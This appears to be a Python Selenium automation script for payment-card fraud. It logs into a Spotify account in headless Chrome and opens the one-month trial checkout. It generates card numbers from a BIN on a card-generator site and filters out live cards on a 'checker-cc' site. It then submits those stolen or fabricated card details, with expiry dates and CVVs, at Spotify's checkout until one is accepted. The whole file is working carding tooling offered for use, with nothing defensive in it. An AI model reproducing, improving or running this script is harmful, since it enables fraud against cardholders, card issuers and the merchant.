from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import chromedriver_autoinstaller
from time import sleep
from subprocess import CREATE_NO_WINDOW


username = ""
password = ""
url = "https://accounts.spotify.com/en/login/"

BIN = ""
country_code = ''

zipcode = ""

fechaMM = ''
if fechaMM == "":
    fechaMM = "RND"
else:
    fechaMM = fechaMM
if int(fechaMM) > 9:
    fechaMM = fechaMM
else:
    fechaMM = "0"+fechaMM

fechaYY = ''
if fechaYY == "":
    fechaYY = "RND"
else:
    fechaYY = fechaYY
chromedriver_autoinstaller.install()
sleep(2)
#------------------Headless Chrome----------------

user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36"

options = webdriver.ChromeOptions()
options.headless = True
options.add_argument(f'user-agent={user_agent}')
options.add_argument("--window-size=1920,1080")
options.add_argument('--ignore-certificate-errors')
options.add_argument('--allow-running-insecure-content')
options.add_argument("--disable-extensions")
options.add_argument("--proxy-server='direct://'")
options.add_argument("--proxy-bypass-list=*")
options.add_argument("--start-maximized")
options.add_argument('--disable-gpu')
options.add_argument('--disable-dev-shm-usage')
options.add_argument('--no-sandbox')
driver = webdriver.Chrome(options=options)
# driver = webdriver.Chrome(ChromeDriverManager().install(), options=options)

def LoginSpotify():

    driver.get(url)
    sleep(2)
    driver.find_element_by_id("login-username").send_keys(username)
    driver.find_element_by_id("login-password").send_keys(password)
    driver.find_element_by_id("login-button").click()
    sleep(1)
    if driver.current_url == "https://accounts.spotify.com/en/status":

        sleep(2)

        if country_code != "us":
            driver.get("https://www.spotify.com/"+country_code+"-en/purchase/offer/default-trial-1m/?country="+country_code.upper())
        else:
            driver.get("https://www.spotify.com/"+country_code+"/purchase/offer/default-trial-1m/?country="+country_code.upper())
        sleep(10)
        if len(driver.find_elements_by_id("onetrust-policy-text")) > 0:
            driver.find_element_by_class_name("onetrust-close-btn-handler.onetrust-close-btn-ui.banner-close-button.ot-close-icon").click()
        sleep(1)
        driver.find_element_by_class_name("Indicator-sc-16vj7o8-0.bfMyiz").click()
        sleep(1)
        status = "OK"
        print("Login Successful")

    else:
        print("Login Unsuccessful")
        status = "NO"


        driver.quit()
    return status


def GenerateCC():
    sleep(1)
    driver.execute_script("window.open('');")
    driver.switch_to.window(driver.window_handles[1])
    driver.get("https://www.bestccgen.com/namso-ccgen/")
    sleep(1)
    driver.find_element_by_id("ccpN").send_keys(BIN)
    if fechaMM == "RND":
        driver.find_element_by_name("emeses").click()
        sleep(1)
        driver.find_element_by_xpath("//select/option[@value='rnd']")
    else:
        driver.find_element_by_name("emeses").click()
        sleep(1)
        driver.find_element_by_xpath("//select/option[@value='"+fechaMM+"']").click()
    if fechaYY == "RND":
        driver.find_element_by_name("eyear").click()
        sleep(1)
        driver.find_element_by_xpath("//select/option[@value='rnd']")
    else:
        driver.find_element_by_name("eyear").click()
        sleep(1)
        driver.find_element_by_xpath("//select/option[@value='" + "20" + fechaYY + "']").click()

    driver.find_element_by_name("ccghm").send_keys(0)
    driver.find_element_by_id("gerar").click()
    driver.find_element_by_id("output2").send_keys(Keys.CONTROL + "a")
    driver.find_element_by_id("output2").send_keys(Keys.CONTROL + "c")

    print("CC Generated!")
    sleep(1)



def CheckCC():
    driver.execute_script("window.open('');")
    driver.switch_to.window(driver.window_handles[2])
    driver.get("https://gostrafx.com/checker-cc/index.php")
    sleep(1)
    driver.find_element_by_id("cc").send_keys(Keys.CONTROL + "v")
    driver.find_element_by_name("valid").click()
    sleep(35)
    liveCC = driver.find_element_by_class_name("panel-body.success").text
    counter = 1
    for i in liveCC.split('\n'):
        global cc

        cc = i[7:].split(' ')[0]
        live_cc_db[counter]['CC'] = cc[:16]
        live_cc_db[counter]['MM'] = cc[17:19]
        live_cc_db[counter]['YY'] = cc[22:24]
        live_cc_db[counter]['CVV'] = cc[25:28]
        if counter == 3:
            break
        counter = counter+1

def TryCC():
    driver.switch_to.window(driver.window_handles[0])
    sleep(2)
    iframe = driver.find_element_by_class_name("pci-iframe")
    global counter_2, status_check
    counter_2 = 0
    while counter_2 != 3:
        driver.switch_to.frame(iframe)


        counter_2 = counter_2+1

        driver.find_element_by_id("cardnumber").clear()
        sleep(1)
        driver.find_element_by_id("cardnumber").send_keys(live_cc_db[counter_2]["CC"])

        driver.find_element_by_id("expiry-date").clear()
        sleep(1)
        driver.find_element_by_id("expiry-date").send_keys(live_cc_db[counter_2]["MM"]+"/"+live_cc_db[counter_2]["YY"])

        driver.find_element_by_id("security-code").clear()
        sleep(1)
        driver.find_element_by_id("security-code").send_keys(live_cc_db[counter_2]["CVV"])

        if len(driver.find_elements_by_id("zip-code")) > 0:

            driver.find_element_by_id("zip-code").clear()
            sleep(1)
            driver.find_element_by_id("zip-code").send_keys(zipcode)
        driver.switch_to.default_content()
        sleep(2)
        if len(driver.find_elements_by_class_name("Indicator-sc-11vkltc-0.cTsnAn")) > 0:
            sleep(1)
            if driver.find_element_by_class_name("Indicator-sc-11vkltc-0.cTsnAn").is_selected():
                sleep(3)
                driver.find_element_by_id("checkout_submit").click()
            else:
                sleep(2)
                driver.find_element_by_class_name("Indicator-sc-11vkltc-0.cTsnAn").click()
                sleep(3)
                driver.find_element_by_id("checkout_submit").click()
        else:
            sleep(2)
            driver.find_element_by_id("checkout_submit").click()


        sleep(15)
        if country_code != "us":
            if driver.current_url != "https://www.spotify.com/"+country_code+"-en/purchase/offer/default-trial-1m/?country="+country_code.upper():

                print("Card is Legit and the BIN is WORKING!")
                status_check = "OK"
                break
        else:
            if driver.current_url != "https://www.spotify.com/"+country_code+"/purchase/offer/default-trial-1m/?country="+country_code.upper():
                print("Card is Legit and the BIN is WORKING!")
                status_check = "OK"
                break

        if counter_2 == 3:
            print("Tried all the Cards, But not working")
            status_check = "NO"
            break
        else:
            sleep(1)
            continue

    print("Process Completed")
    driver.quit()
    return status_check





live_cc_db = {
            1: {"CC": '',
                "MM": '',
                "YY": '',
                "CVV": ''},
            2: {"CC": '',
                "MM": '',
                "YY": '',
                "CVV": ''},
            3: {"CC": '',
                "MM": '',
                "YY": '',
                "CVV": ''}
        }








# LoginSpotify()
# GenerateCC()
# CheckCC()
# TryCC()


